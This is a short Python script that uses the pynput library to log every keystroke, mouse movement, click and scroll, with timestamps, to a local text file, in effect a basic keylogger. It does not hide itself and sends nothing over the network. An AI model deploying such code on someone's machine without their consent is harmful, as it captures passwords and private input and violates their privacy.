from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Key, Listener as KeyboardListener
import logging

key_sequence = []

def on_keypress(key):
    # Add the key pressed to the sequence
    key_sequence.append(str(key))

    # If the 'Enter' key is pressed, log the sequence and clear it
    if key == Key.enter:
        logging.info("Key sequence: " + ' '.join(key_sequence))
        key_sequence.clear()
    
    if key == Key.esc:
        return False

def on_move(x, y):
    logging.info('Pointer moved to {0}'.format((x, y)))

def on_click(x, y, button, pressed):
    logging.info('{0} at {1}'.format('Pressed' if pressed else 'Released', (x, y)))

def on_scroll(x, y, dx, dy):
    logging.info('Scrolled {0} at {1}'.format('down' if dy < 0 else 'up', (x, y)))

log_dir = ""
logging.basicConfig(filename=(log_dir + "key_sequences.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Start the listeners in separate threads
keyboard_listener = KeyboardListener(on_press=on_keypress)
mouse_listener = MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()